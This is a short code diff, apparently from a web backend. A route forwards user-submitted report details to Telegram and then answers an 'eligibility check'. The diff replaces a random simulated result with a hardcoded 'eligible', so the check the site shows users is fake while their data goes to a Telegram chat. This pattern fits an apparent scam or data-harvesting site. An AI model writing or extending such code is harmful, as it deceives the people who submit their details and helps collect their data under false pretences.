@@ -250,11 +250,8 @@ ${validatedData.reportDetails}
 
       await sendToTelegram(telegramMessage);
 
-      // Simulate eligibility result (alternating between eligible and additional-docs)
-      const isEligible = Math.random() > 0.5;
-      
       res.status(200).json({ 
-        result: isEligible ? 'eligible' : 'additional-docs',
+        result: 'eligible',
         message: "Eligibility check completed"
       });
 
